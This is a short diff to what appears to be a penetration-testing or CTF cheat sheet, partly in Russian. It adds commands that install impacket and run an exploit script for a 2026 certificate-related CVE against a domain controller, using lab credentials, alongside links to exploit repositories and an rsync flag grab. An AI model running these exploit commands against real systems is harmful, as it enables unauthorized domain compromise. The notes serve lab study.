@@ -1912,7 +1912,8 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 
 		https://github.com/aniqfakhrul/CVE-2026-54121
 		https://github.com/marcgoam/CVE-2026-54121-CertiGhost
-		
+		sudo pip install --break-system-packages git+https://github.com/fortra/impacket.git cryptography pyasn1 asn1crypto pycryptodome dnspython
+		sudo python3 certighost.py -d lab.local -u max -p 'P@ssword123!' --dc-ip 192.168.0.200
 	
 # Произвольное выполнение файла
 
